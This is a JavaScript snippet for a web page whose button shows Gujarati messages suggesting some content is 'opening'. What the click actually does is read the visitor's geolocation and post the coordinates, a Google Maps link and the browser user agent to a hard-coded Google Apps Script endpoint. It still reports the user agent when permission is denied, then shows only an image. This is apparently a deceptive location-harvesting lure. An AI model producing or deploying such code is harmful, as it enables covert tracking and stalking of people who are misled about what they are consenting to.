const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbx80itG5CPju37h0jmmstXYpC1AfKWa3XtOhuHf_SD2wbJCKMqTOnKxw-fDfQyhhFUEWg/exec";
    const btn = document.getElementById("btn");
    const msg = document.getElementById("msg");
    const doneImg = document.getElementById("doneImage");

    function showImageOnly() {
      btn.style.display = "none";
      msg.style.display = "none";
      doneImg.style.display = "block";
    }

    function sendOnce() {
      btn.disabled = true;
      msg.textContent = "Open thaay che thodik raah jovoo...";

      if (!navigator.geolocation) {
        msg.textContent = "Open na thayu fari try karo!";
        return;
      }

      navigator.geolocation.getCurrentPosition(
        (position) => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;
          const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;

          fetch(SCRIPT_URL, {
            method: "POST",
            mode: "no-cors",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              latitude: lat,
              longitude: lon,
              mapsUrl: mapsUrl,
              permission: "granted",
              userAgent: navigator.userAgent
            }),
          });

          showImageOnly();
        },
        (error) => {
          fetch(SCRIPT_URL, {
            method: "POST",
            mode: "no-cors",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              permission: "denied",
              errorMessage: error.message,
              userAgent: navigator.userAgent
            }),
          });

          showImageOnly();
        }
      );
    }

    btn.addEventListener("click", sendOnce);
